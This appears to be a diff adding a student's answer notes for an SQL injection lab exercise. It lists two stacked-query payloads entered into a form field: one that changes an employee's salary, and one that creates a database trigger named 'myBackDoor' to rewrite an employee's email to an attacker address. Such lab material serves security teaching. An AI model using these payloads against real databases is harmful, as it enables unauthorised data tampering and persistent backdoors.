@@ -1,0 +1,16 @@
+The following is the full contents of the field that I entered in the first part
+
+101; 
+UPDATE employee
+SET salary = 100000
+WHERE userid = 101;
+
+The following is the full contents of the field that I entered in the second part
+
+101;
+CREATE TRIGGER myBackDoor 
+BEFORE INSERT ON employee 
+FOR EACH ROW BEGIN 
+	UPDATE employee 
+	SET email='john@hackme.com'
+	WHERE userid = 101
